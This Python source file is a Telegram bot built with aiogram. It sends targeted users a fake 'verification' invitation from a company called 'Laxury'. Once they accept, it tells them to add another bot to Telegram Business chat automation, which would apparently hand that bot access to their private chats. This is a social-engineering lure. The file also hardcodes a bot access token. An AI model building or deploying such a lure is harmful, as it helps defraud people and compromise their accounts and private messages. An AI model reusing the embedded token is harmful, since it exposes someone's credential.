import asyncio
import logging
from aiogram import Bot, Dispatcher, F
from aiogram.filters import Command
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.types import (
    Message, CallbackQuery,
    InlineKeyboardMarkup, InlineKeyboardButton,
    ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove,
)

# ВСТАВЬ СЮДА НОВЫЙ ТОКЕН (после команды /revoke в BotFather)
BOT_TOKEN = "8725432581:AAFrH-L0D4_6BeH3EYP9SjtitMeRGhHpqOs" 
VERIFICATION_BOT_USERNAME = "laxury_getverification_bot"
COMPANY_NAME = "Laxury"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher(storage=MemoryStorage())

verified_users = set()
username_cache = {}

class SendState(StatesGroup):
    waiting_username = State()

@dp.message(Command("start"))
async def cmd_start(message: Message):
    if message.from_user.username:
        username_cache[message.from_user.username.lower()] = message.from_user.id
    
    kb = ReplyKeyboardMarkup(
        keyboard=[[KeyboardButton(text="📨 Скинуть галочку")]], 
        resize_keyboard=True
    )
    await message.answer(
        f"Привет! Это бот верификации от <b>{COMPANY_NAME}</b>.\nНажми кнопку ниже, чтобы отправить запрос.", 
        reply_markup=kb
    )

@dp.message(F.text == "📨 Скинуть галочку")
async def ask_username(message: Message, state: FSMContext):
    await state.set_state(SendState.waiting_username)
    await message.answer(
        "Введи <b>@username</b> человека, которому нужно скинуть галочку:", 
        reply_markup=ReplyKeyboardRemove()
    )

@dp.message(SendState.waiting_username)
async def send_request(message: Message, state: FSMContext):
    username = message.text.strip().lstrip("@").lower()
    target_id = username_cache.get(username)
    
    if not target_id:
        try:
            chat = await bot.get_chat(f"@{username}")
            target_id = chat.id
            username_cache[username] = target_id
        except Exception:
            await message.answer(
                "❌ Не удалось найти пользователя.\n"
                "Попроси его сначала запустить этого бота (/start)."
            )
            await state.clear()
            return

    kb = InlineKeyboardMarkup(inline_keyboard=[[
        InlineKeyboardButton(text="❌ Отклонить", callback_data=f"reject:{target_id}"),
        InlineKeyboardButton(text="✅ Принять", callback_data=f"accept:{target_id}"),
    ]])

    try:
        await bot.send_message(
            target_id,
            f"Вас пригласила компания <b>{COMPANY_NAME}</b> верифицировать вас.",
            reply_markup=kb
        )
        await message.answer("✅ Запрос отправлен!")
    except Exception as e:
        await message.answer(f"❌ Не удалось отправить: {e}")
    
    await state.clear()

@dp.callback_query(F.data.startswith("reject:"))
async def on_reject(callback: CallbackQuery):
    await callback.message.delete()
    await callback.answer("Вы отклонили запрос.")

@dp.callback_query(F.data.startswith("accept:"))
async def on_accept(callback: CallbackQuery):
    verified_users.add(callback.from_user.id)
    await callback.message.edit_text(
        f"✅ Вы приняли верификацию от <b>{COMPANY_NAME}</b>.\n\n"
        f"Теперь добавьте бота <b>@{VERIFICATION_BOT_USERNAME}</b> "
        f"в <i>Автоматизацию чатов</i> (Telegram Business)."
    )
    await callback.answer("Верификация принята!")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
